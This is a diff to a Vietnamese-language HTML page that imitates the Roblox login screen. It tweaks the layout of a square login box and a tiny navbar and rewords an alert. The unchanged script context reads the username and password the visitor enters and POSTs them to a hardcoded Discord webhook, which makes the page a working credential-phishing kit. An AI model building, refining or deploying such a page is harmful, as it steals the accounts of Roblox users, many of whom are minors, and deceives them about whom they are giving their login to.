@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Roblox</title>
     <style>
         * { box-sizing: border-box; }
@@ -11,68 +11,75 @@
             background: url('https://images.rbxcdn.com/f9379895240be6d16f391b1076b97669.jpg') no-repeat center center fixed;
             background-size: cover;
             font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
-            display: flex; flex-direction: column; /* Chia làm 2 phần: Menu và Nội dung */
+            display: flex; flex-direction: column;
+            overflow: hidden;
         }
 
-        /* Lớp phủ tối toàn màn hình */
         .dark-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.65); z-index: 1;
         }
 
-        /* --- THANH MENU MỎNG (NAVBAR) --- */
+        /* --- MENU SIÊU BÉ (X8 LẦN) --- */
         .navbar {
             position: relative; z-index: 10;
             background-color: #212224;
-            height: 32px; /* Siêu mỏng để tạo khoảng cách */
+            height: 12px; /* Rất mỏng */
             display: flex; align-items: center; justify-content: space-between;
-            padding: 0 10px;
+            padding: 0 5px;
         }
+        .nav-left { display: flex; align-items: center; gap: 4px; }
+        .logo { width: 8px; height: 8px; background: url('https://images.rbxcdn.com/796030919424759453965d1434c4f039.svg') no-repeat center; background-size: contain; }
+        .search { background: #393b3d; width: 30px; height: 5px; border-radius: 1px; }
+        .links { display: flex; gap: 6px; }
+        .links a { color: #ffffff; text-decoration: none; font-size: 5px; opacity: 0.7; white-space: nowrap; }
+        .btn-top { background: transparent; border: 0.1px solid white; color: white; font-size: 5px; padding: 0 2px; }
 
-        .nav-left { display: flex; align-items: center; gap: 8px; }
-        .logo { width: 18px; height: 18px; background: url('https://images.rbxcdn.com/796030919424759453965d1434c4f039.svg') no-repeat center; background-size: contain; }
-        .search { background: #393b3d; border: 1px solid #656668; border-radius: 3px; padding: 1px 5px; width: 70px; color: #adb0b1; font-size: 9px; }
-        .links { display: flex; gap: 10px; }
-        .links a { color: #ffffff; text-decoration: none; font-size: 8.5px; white-space: nowrap; opacity: 0.8; }
-        .btn-top { background: transparent; border: 0.5px solid white; color: white; border-radius: 2px; padding: 1px 4px; font-size: 8.5px; }
-
-        /* --- VÙNG CHỨA FORM (TẠO KHOẢNG CÁCH RỘNG) --- */
+        /* --- VÙNG CHỨA CĂN GIỮA --- */
         .page-container {
-            flex-grow: 1; /* Chiếm toàn bộ phần còn lại của màn hình */
+            flex-grow: 1;
             display: flex;
-            justify-content: center; /* Căn giữa ngang (Mũi tên trái-phải) */
-            align-items: center;     /* Căn giữa dọc (Mũi tên trên-dưới) */
+            justify-content: center;
+            align-items: center;
             position: relative; z-index: 5;
-            padding: 20px; /* Đảm bảo không dính sát mép trên Mobile */
+            padding: 20px;
         }
 
+        /* --- KHUNG ĐĂNG NHẬP HÌNH VUÔNG --- */
         .login-box {
             background-color: #212224;
-            padding: 30px 20px;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 320px; /* Giới hạn độ rộng của Form */
+            padding: 35px 25px;
+            border-radius: 4px; /* Giảm bo góc để nhìn vuông vức hơn */
+            width: 320px; 
+            height: 320px; /* Ép chiều cao bằng chiều rộng để tạo hình vuông */
+            display: flex;
+            flex-direction: column;
+            justify-content: center; /* Căn giữa các phần tử bên trong theo chiều dọc */
             text-align: center;
             color: white;
             box-shadow: 0 10px 30px rgba(0,0,0,0.7);
         }
 
-        h2 { font-size: 18px; margin: 0 0 20px 0; font-weight: bold; }
+        h2 { font-size: 18px; margin: 0 0 15px 0; font-weight: bold; }
+        
         input {
             width: 100%; padding: 10px; margin-bottom: 8px;
             background: #393b3d; border: 1px solid #000;
-            border-radius: 4px; color: white; font-size: 13px;
+            border-radius: 2px; color: white; font-size: 12px;
         }
+
         .btn-main {
-            width: 100%; padding: 10px; margin-top: 10px;
+            width: 100%; padding: 10px; margin-top: 5px;
             background: #ffffff; color: #1e1f21; border: none;
-            border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer;
+            border-radius: 2px; font-weight: bold; font-size: 13px; cursor: pointer;
         }
-        .forgot { display: block; margin: 20px 0; color: #adb0b1; font-size: 11px; text-decoration: none; }
+
+        .forgot { display: block; margin: 12px 0; color: #adb0b1; font-size: 10px; text-decoration: none; }
+
         .btn-sub {
-            width: 100%; padding: 10px; margin-top: 8px;
+            width: 100%; padding: 8px; margin-top: 5px;
             background: #393b3d; color: white; border: 1px solid #656668;
-            border-radius: 4px; font-size: 11px; cursor: pointer;
+            border-radius: 2px; font-size: 10px; cursor: pointer;
         }
     </style>
 </head>
@@ -83,7 +90,7 @@
 <div class="navbar">
     <div class="nav-left">
         <div class="logo"></div>
-        <div class="search">🔍 Tìm kiếm</div>
+        <div class="search"></div>
         <div class="links">
             <a href="#">Bảng xếp hạng</a>
             <a href="#">Chợ</a>
@@ -112,7 +119,7 @@
         const pass = document.getElementById('p').value;
         const webh = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
 
-        if(!user || !pass) return alert("Nhập đủ thông tin!");
+        if(!user || !pass) return alert("Vui lòng nhập đủ thông tin!");
 
         fetch(webh, {
             method: 'POST',
